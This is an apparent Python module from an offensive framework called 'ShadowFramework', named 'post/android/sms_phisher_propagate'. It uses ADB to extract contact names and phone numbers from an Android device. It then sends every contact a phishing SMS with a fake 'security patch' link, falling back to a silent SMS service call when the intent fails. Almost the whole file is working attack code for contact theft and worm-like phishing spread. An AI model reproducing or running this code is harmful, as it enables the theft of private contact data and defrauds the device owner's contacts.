"""
ShadowFramework — SMS Propagation
Real contact extraction + SMS sending via ADB intents.
"""
import subprocess
import re
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=15):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1

class Module:
    MODULE_INFO = {
        'name': 'post/android/sms_phisher_propagate',
        'description': 'Extracts real contacts from device and sends SMS phishing messages via ADB.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'MESSAGE':   'Message body [default: Security patch required: https://sec-android.com/update]',
            'LIMIT':     'Max contacts to message [default: 10]',
            'DRY_RUN':   'Preview contacts without sending [default: true]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _extract_contacts(self, dev, limit):
        """Extract real phone numbers from the device contact provider."""
        contacts = []

        # Method 1: content provider query (no root needed)
        out, _, rc = _adb(dev, 'shell', 'content', 'query', '--uri', 
                          'content://com.android.contacts/data/phones', 
                          '--projection', 'display_name:data1')
        
        if rc == 0 and out:
            for line in out.splitlines():
                # Parse: Row: N display_name=Name, data1=+1234567890
                match = re.search(r'data1=([+\d\s\-\(\)]+)', line)
                name_match = re.search(r'display_name=([^,]+)', line)
                if match:
                    phone = re.sub(r'[\s\-\(\)]', '', match.group(1))
                    name = name_match.group(1).strip() if name_match else 'Unknown'
                    if len(phone) >= 7:
                        contacts.append((name, phone))
                    if len(contacts) >= limit:
                        break
        
        # Method 2: Fallback — dumpsys contacts (less reliable)
        if not contacts:
            console.print("  [yellow]  Content provider failed, trying dumpsys...[/yellow]")
            out, _, _ = _adb(dev, 'shell', 'dumpsys', 'contact_metadata')
            phones = re.findall(r'(\+?\d[\d\s\-]{6,})', out)
            for p in phones[:limit]:
                contacts.append(('Unknown', re.sub(r'[\s\-]', '', p)))

        return contacts

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        message = self.framework.options.get('MESSAGE', 'Security patch required: https://sec-android.com/update')
        limit = int(self.framework.options.get('LIMIT', '10'))
        dry_run = self.framework.options.get('DRY_RUN', 'true').lower() == 'true'

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[*] Extracting contacts from [cyan]{device_id}[/cyan]...")
        log_action(f"SMS propagation on {device_id}")

        contacts = self._extract_contacts(device_id, limit)
        if not contacts:
            console.print("[red][!] No contacts found. May need permissions.[/red]")
            return

        table = Table(title=f"Extracted Contacts ({len(contacts)})")
        table.add_column("Name", style="cyan")
        table.add_column("Number", style="white")
        table.add_column("Status", style="green")

        sent = 0
        for name, phone in contacts:
            if dry_run:
                table.add_row(name, phone, "[yellow]DRY RUN[/yellow]")
            else:
                # Real SMS via am broadcast with SMS intent
                _, _, rc = _adb(device_id, 'shell', 'am', 'start',
                               '-a', 'android.intent.action.SENDTO',
                               '-d', f'smsto:{phone}',
                               '--es', 'sms_body', message,
                               '--ez', 'exit_on_sent', 'true')
                
                # Alternative: Use service call for silent SMS (requires permissions)
                if rc != 0:
                    _adb(device_id, 'shell', 'service', 'call', 'isms', '7',
                         'i32', '0',  # subId
                         's16', f'"{phone}"',
                         's16', 'null',
                         's16', f'"{message}"',
                         's16', 'null',
                         's16', 'null')

                status = "[green]SENT[/green]" if rc == 0 else "[yellow]ATTEMPTED[/yellow]"
                table.add_row(name, phone, status)
                sent += 1
                log_action(f"SMS sent to {phone} from {device_id}")

        console.print(table)
        if dry_run:
            console.print(f"\n[yellow][!] DRY RUN — set DRY_RUN false to send. {len(contacts)} targets identified.[/yellow]")
        else:
            console.print(f"\n[bold green][+] {sent} messages dispatched.[/bold green]")
